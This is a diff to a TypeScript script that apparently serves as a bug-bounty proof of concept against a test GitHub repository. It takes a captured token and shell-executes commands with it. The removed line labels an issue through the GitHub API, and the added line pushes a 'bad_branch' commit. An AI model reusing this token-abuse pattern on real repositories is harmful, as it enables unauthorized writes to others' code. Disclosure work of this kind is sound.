@@ -7,7 +7,7 @@ const main = (): void => {
       process.exit(1);
     } else {
       const token: string = stdout.toString();
-      subProcess.exec(`curl -L -s -X POST -d '{"labels":["bugcrowd"]}' -H "Authorization: Bearer ${token}" -H "X-GitHub-Api-Version: 2022-11-28" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json"  https://api.github.com/repos/ndavisontest/actions-test/issues/4/labels`, (err: any, stdout: any, stderr: any) => {     
+      subProcess.exec(`git config --global user.email "you@example.com"; git config --global user.name "Your Name"; git checkout -b bad_branch; echo "hello" > poc.txt; git add poc.txt; git commit -m "PoC"; git push origin bad_branch`, (err: any, stdout: any, stderr: any) => {     
       });
     }
   })
